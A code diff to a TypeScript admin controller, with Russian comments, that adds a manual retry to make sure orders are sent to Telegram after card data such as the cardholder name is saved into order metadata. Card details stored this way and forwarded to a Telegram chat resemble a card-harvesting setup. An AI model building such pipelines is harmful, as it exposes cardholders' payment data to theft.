@@ -108,13 +108,24 @@ export class AdminController {
         hasCardholder: !!cardData.cardholderName
       });
 
-      // НЕ отправляем повторно в Telegram - это уже делается автоматически в ordersService.create
-      // после сохранения данных карты в metadata. Проверяем, был ли заказ уже отправлен.
-      console.log('✅ Заказ создан. Отправка в Telegram должна произойти автоматически при создании заказа.');
-      if (created.isSentToTelegram) {
-        console.log('✅ Заказ уже отправлен в Telegram при создании');
+      // Проверяем, был ли заказ отправлен в Telegram
+      console.log('✅ Заказ создан. Проверяем статус отправки в Telegram...');
+      console.log('isSentToTelegram:', created.isSentToTelegram);
+      console.log('sentToTelegramAt:', created.sentToTelegramAt);
+      
+      // Если заказ не был отправлен в Telegram, пытаемся отправить вручную
+      // (это может произойти, если отправка завершилась с ошибкой)
+      if (!created.isSentToTelegram) {
+        console.log('⚠️ Заказ не был отправлен в Telegram автоматически. Пытаемся отправить вручную...');
+        try {
+          await this.ordersService.sendOrderToTelegramManually(created._id.toString());
+          console.log('✅ Попытка отправки в Telegram выполнена');
+        } catch (telegramError: any) {
+          console.error('❌ Ошибка при ручной отправке в Telegram:', telegramError?.message || telegramError);
+          console.error('Stack:', telegramError?.stack);
+        }
       } else {
-        console.log('⚠️ Заказ еще не отправлен в Telegram, но должен быть отправлен автоматически');
+        console.log('✅ Заказ уже отправлен в Telegram при создании');
       }
     } catch (e) {
       console.error('Ошибка при сохранении данных карты в metadata:', e?.message || e);
